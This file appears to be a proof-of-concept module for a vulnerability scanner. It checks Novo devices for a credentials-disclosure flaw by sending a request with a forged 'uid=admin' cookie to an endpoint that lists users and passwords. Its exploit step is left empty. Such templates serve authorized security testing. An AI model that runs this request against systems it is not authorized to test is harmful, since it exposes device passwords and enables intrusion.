import requests

from loguru import logger

from .base import POCTemplate


class NovoCredentialsDisclosure(POCTemplate):

    def __init__(self, config):
        super().__init__(config)
        self.name = self.get_file_name(__file__)
        self.product = config.product['novo']
        self.product_version = ''
        self.ref = ''
        self.level = POCTemplate.level.high
        self.desc = """"""
        self.headers = {'Connection': 'close', 'User-Agent': self.config.user_agent, 'Cookie': 'uid=admin'}

    def verify(self, ip, port=80):
        url = f"http://{ip}:{port}/device.rsp?opt=user&cmd=list"
        try:
            r = requests.get(url, headers=self.headers, timeout=self.config.timeout, verify=False)
            if r.status_code == 200 and ('admin' in r.text) and ('pwd' in r.text):
                return ip, str(port), self.product, '', '', self.name
        except Exception as e:
            logger.error(e)
        return None

    def exploit(self, results):
        pass


POCTemplate.register_poc(NovoCredentialsDisclosure)
